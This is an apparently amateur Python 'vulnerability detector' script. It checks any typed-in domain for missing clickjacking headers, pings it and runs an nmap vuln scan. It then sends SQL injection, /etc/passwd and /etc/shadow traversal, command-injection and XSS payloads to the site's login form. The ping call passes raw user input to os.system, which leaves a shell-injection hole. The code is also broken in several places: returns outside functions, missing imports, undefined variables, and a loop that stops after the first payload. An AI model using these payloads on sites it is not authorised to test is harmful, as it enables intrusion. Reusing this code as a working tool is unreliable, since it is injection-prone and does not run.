import requests
import nmap
import time
from tqdm import tqdm
import os
import colorama
from colorama import *
import MySQLdb
import sys

os.system('clear')
print('''
                _                       
                \`*-.                *KSVD Hunt*
                 )  _`-.                
                .  : `. .               
                : _   '  \              
                ; *` _.   `*-._         
                `-.-'          `-.      
                  ;       `       `.    
                  :.       .        \   
                  . \  .   :   .-'   .  
                  '  `+.;  ;  '      :  
                  :  '  |    ;       ;-.
                  ; '   : :`-:     _.`* ;
               .*' /  .*' ; .*`- +'  `*'
               `*-*   `*-*  `*-*' 
       __QQ
      (_)_">
     _)          
                    Kitty Scanner Vulnerability Detector. by KazuKo (BETA)
            ''')
# Click jacking x-frame detection

print('~ Click Jacking X-Frame-Options Detections ~')
print("\n")

# URL cible

domain = input('[-] ~ Enter a mice homename : ')
headers = requests.get('https://'+domain).headers

#click jacking réponse
if 'X-Frame-Options' in headers:

    print("\n")
    print(Fore.RED+"[X] ~ " + domain + " NOT VULNERABLE")

else:

    print("\n")
    print(Fore.GREEN+"[V] ~ " + domain + " VULNERABLE")

# Pour performer un ping afin de voir le delai du site

print("\n")

choice = input(Fore.WHITE+"Do you want to perform a ping on the website ? [Y/n] : ")
if choice == "n":

    exit()

else:

    print("\n")
    os.system("ping -c 1 " + '' + domain+''+''+ '|grep' + ' ' + ' ' + '"bytes from"')

# NMAP scan

print("\n")
choice = input("Do you want to perform an NMAP vuln scan ? [Y/n] : ")

if choice == "n":
    exit()

else:
   
    print("\n")
    ip_addr = domain
    scanner = nmap.PortScanner()
   
    for i in tqdm(range(10)):
   
        time.sleep(0.2)
    
    print("\n")
    print('[#] ~ Starting scan now !')

    time.sleep(1)

    print("\n")
    print('[#] ~ Waiting for result ...')

    print("\n")
   
    # Flag utiliser pour les scan NMAP plus enregistrement dans un .txt
    scanner.scan(ip_addr, '1-1024', '--script=vulners --script=default --script=vuln -sS -v > scan_'+domain+'.txt')
    
    # Status des ports ouvert ou fermer

    print("[#] ~ Ip Status: ", scanner[ip_addr].state())
    print("[V] ~ Open Ports : ", str(scanner[ip_addr]['tcp'].keys()).replace('[','').replace(']','').replace("dict_keys(","").replace(')',''))

def test_vulnerability(target_url, payload):
    payloads = [
        # SQLI
        "admin'--",
        "' OR 1=1 --",
        "admin' OR '1'='1 --",
        # Injection de commandes OS
        "../../etc/passwd",
        "../../etc/shadow",
        "../../../../../../etc/passwd",
        "../../../../../../etc/shadow",
        "'; touch /tmp/common;'",
        # Injection de code XSS
        "<script>alert('1')</script>",
        "<script\x20type='text/javascript'>javascript:alert(1);</script>",
        "<img src=1 href=1 onerror='javascript:alert(1)'></img>",
    ]
    #URL cible 
    target_url = domain

    # Test des payload
    for payload in payloads:

        r = requests.post(target_url, data={'username': payload, 'password': payload})

        if payload in r.text:

            print("Vulnérability detected with the payload :", payload)
             return True

        else:

            print("No Vulnérability detected with the payload :", payload)
            return False

# Fonction qui génère des payloads aléatoires
def generate_payload():
    # Génération d'un payload aléatoire à partir de caractères alphabétiques

    payload = ''.join(random.choices(string.ascii_letters, k=10))
    return payload

# Boucle infinie qui génère et envoie des payloads aléatoires à la cible
while True:

    payload = generate_payload()

    result = test_vulnerability(target_url, payload)

    if result:

        print("Vulnérabilité détectée avec le payload :", payload)
        return True

    else:

        print("Aucune vulnérabilité détectée avec le payload :", payload)
        return False